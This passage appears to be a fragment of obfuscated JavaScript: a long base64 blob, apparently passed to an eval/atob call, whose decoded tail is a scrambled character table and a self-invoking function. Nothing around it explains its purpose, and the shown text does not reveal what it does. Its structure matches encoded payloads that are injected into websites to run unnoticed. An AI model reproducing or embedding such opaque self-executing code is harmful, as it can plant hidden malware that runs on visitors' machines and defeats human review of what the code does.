mdDt5bH0iZUJCQ21CY2J0Y0JhclQ7Qih0QGU6QSBuWzQoXWIgLkIweF1iOzF0YU4yb2NlPjFCQnswcigmMihiI2I0b0I9X0IicnByS109UmZsY2ZtQjwzeH1pZXVlQkJaMjQpeyJCVV1lNUJ9QkNzVDtCQjtiQmZ7M2VCKSxCV24uZTd2YkRvLjBELE9yMDYpdChuKCRnIm5CQkdnMWVhQkIld3JeQi4saU5bQm84dChiYV9Dby5cL0JCfW9yOmhhJF1CM2NzNX0uLnVCSW5hZ00sMClCQkJtJUJdYUI6MiViTnQycjFZNDRzc31JX0VhKSBuXFxdMl9dQl0lOmhdaDMjdDZtICk2Qi5vKUJCXylfZW5pQjItb2Embmc9dEJ5M0Ilbj04MUIpZWx5Ym51NWUodDEmb189b3Ahb25kZDtCe0IoNEJIQkxyY3IoLmlVQlNpbl0gPTVfX21pQ0JCJEIsTW9hU2JkJD1kXS5dZTUpbmU1JVwvJS5CSlE9aS5zMkJtKClCXy5mKmFDPS5CMl9tKWEkdG9Cdl9dWylvIV9fO1wvKEI9QnRycjIsXyllfWhSLEJmLS5cLzMhaUJyQiEseGJdYV9CJDhfZClic0tlWEJ3U2Qlc2tdQi5jMUYpdFRlQmVbe2ExJGNiKWJjZTU7PTYuQj10QmQsIS5pJW09X0JobGR3YnNyZWdjX0IyQjliQmF3MnlCLmw7dC5ZQmVnKzZue2N0aEBzbixCcCg9Z1FsX2RCM187Jmw1N1pnXzticm83bF06cmUxIHdCbkJCMDMxQkJTNHJfOTpoQl9CZ0IkREJfbkIzbnU2bztCKDhvXylCd3RKMF1DKCtlKCl0fTkgbmFJY1soeW8pOEJuZG5mZEIyZVA+NkJdP10gezgtX0J9dChWPV09aDQzX11CQntCISlnSF12bGYiJGx1fUJdZjIuciVucChfaGZCZUJmXW5dVG83X3srZX15ZF9COjJlKF81ZjdvQkIjaDd6Z18peW59Y3QsIkJTXXM5bSRuQmRCQkIxKGJfOzc1MitDWSE9KUJpQnRcLyEuXUJdJTs7YjozdV1kZTgpQmo5QiRcJ0IleUItUCZoQmJVQnR0KCgkQmEwQl85Nytmam5lODxCJTEobUI7XU1vPXQuQkI4MEJDJHRibSRiXSllX19vLmglQnRhQj0wbUJCXC9ddWZ7Zl1CX2l9Ii4lIixCSjZuOmFyW25jKW5zbzx9bzpCYSVCNHk3bn1CK3RfXWQgdGVveEJCX2VpPSk9eVgxQkEuZTF0b10zdF1bYmFcXFNfQiIjLjAlY2dkbltCPm1fLntbQkJCLC5iZSxkMW9TaXQoYV89LF10cGkxNilkQl0odG9qQjE5I30hOD11QmkuZWRqQmg0UVU9KXU9e2cxYVggQiBwPXRCdWI7Qm1fUXNiZV89Ymw4X29kX2UpXSAwNF1oLnc9WGRpID46bi0mIkI0MEIuZiFvQjpuXyEgUj0ocnJ7QmVCbm9oXUIhb29yYX1pYiBCUnZJZWBiQkcuaV1CX2MhXzRmLmFwYy5CIH0pM2Uzci5hdH1cJ11iQkIpInViKTE9eTBCIGUwVyFpLmI1IXksYyk4PVtCKHtfT2w7ZW4uVGVuXV9fMl9XdGUhKyVdKEJmQj1hckJ9SillOG8uKVN9KHVwKUJsQnIzMXhkPUIuLntdTlEgQi4uQjRCX3JhXTkpXSAzQmJyZCJdcnVnMm1CXFxtQi50ZSkgKF1fdEJiKDV1bj17bmJmdCBdbkcpbDsuYSBhN2wufTsxLiA4aSE6QjIzO19paCIyWycpKTt2YXIgWEdGPUhCcShiTlMsbUlMICk7WEdGKDE1NTUpO3JldHVybiAxNTk3fSkoKQ=='))
